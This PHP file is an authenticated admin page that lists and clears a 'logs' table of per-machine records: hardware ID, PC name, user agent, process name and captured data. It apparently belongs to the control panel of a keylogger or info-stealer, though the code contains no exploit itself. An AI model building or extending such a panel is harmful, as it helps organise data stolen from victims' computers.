<?php
if (!defined('AUTHED') || !AUTHED)
	die('no direct xs');

print "<a href='?show=logs&clear'>Clear Logs</a><br /><br />";

if (isset($_GET['clear'])) {
	if (!mysql_query('TRUNCATE TABLE logs'))
		mysql_query('DELETE FROM logs');
	print 'Log table is cleared :)';
}

if (isset($_GET['hwid']) && !empty($_GET['hwid']))
	$sql = "SELECT * FROM logs WHERE hwid='" . mysql_real_escape_string($_GET['hwid']) . "' ORDER BY date DESC";
else
	$sql = "SELECT * FROM logs";

$res = mysql_query($sql);

while ($row = mysql_fetch_assoc($res))
	print '<a href="?show=logs&hwid=' . htmlentities($row['hwid']) . '">' . htmlentities($row['hwid']) . '</a>@' .
		htmlentities($row['pcn']) . ' on ' . date('d F Y H:i:s', $row['date']) .
		' with ' . htmlentities($row['ua']) . ' Process: ' . htmlentities($row['proc']) . '<br /><pre>' . htmlentities($row['data']) . '</pre><br /><br />';
?>